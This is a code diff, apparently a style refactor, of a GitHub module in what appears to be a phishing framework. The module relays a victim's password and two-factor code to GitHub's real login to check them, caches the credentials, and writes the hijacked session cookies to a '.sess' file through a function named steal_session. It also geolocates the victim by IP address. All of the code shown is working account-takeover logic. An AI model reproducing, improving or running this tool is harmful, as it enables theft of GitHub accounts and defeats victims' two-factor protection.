@@ -48,8 +48,7 @@ class GithubModule(BaseModule):
         possible_passwd = request.values.get('password')
 
         try:
-            valid_creds = self.submit_creds(self.user, possible_passwd)
-            if valid_creds:
+            if valid_creds := self.submit_creds(self.user, possible_passwd):
                 self.password = request.values.get('password')
                 functions.cache_creds(self.name, self.user, self.password)
                 return redirect('/twofactor', code=302)
@@ -73,11 +72,7 @@ class GithubModule(BaseModule):
         self.browser["login"] = user
         self.browser["password"] = passwd
         self.browser.submit_selected()
-        if self.browser.get_url() == 'https://github.com/sessions/two-factor':
-            # Valid creds result in a redirect to /sessions/two-factor
-            return True
-        else:
-            return False
+        return self.browser.get_url() == 'https://github.com/sessions/two-factor'
 
     def submit_otp(self, otp):
         """
@@ -89,11 +84,7 @@ class GithubModule(BaseModule):
         self.browser["otp"] = otp
         self.browser.submit_selected()
         page = self.browser.get_url()
-        if page == 'https://github.com/sessions/two-factor':
-            # Bad OTPs just reload the OTP page
-            return False
-        else:
-            return True
+        return page != 'https://github.com/sessions/two-factor'
 
     def twofactor(self):
         """
@@ -115,7 +106,7 @@ class GithubModule(BaseModule):
         """ Write current active GutHub session to `file` """
         with open(file, "a+") as store:
             for cookie, value in self.browser.session.cookies.iteritems():
-                data = "{}={};\n".format(cookie, value)
+                data = f"{cookie}={value};\n"
                 store.write(data)
 
     def redirect(self):
@@ -129,15 +120,13 @@ class GithubModule(BaseModule):
         valid_otp = self.submit_otp(self.two_factor_token)
         if not valid_otp:
             return redirect('/twofactor?error=1', code=302)
-        
-        file = "./{}.sess".format(self.user)
+
+        file = f"./{self.user}.sess"
         self.steal_session(file)
 
         city, region, zip_code = '','',''
         try:
-            geoip_url = 'https://freegeoip.net/json/{}'.format(
-                request.remote_addr
-            )
+            geoip_url = f'https://freegeoip.net/json/{request.remote_addr}'
             geo_browser = mechanicalsoup.StatefulBrowser()
             geo_response = geo_browser.open(geoip_url)
             geo = json.loads(geo_response.text)
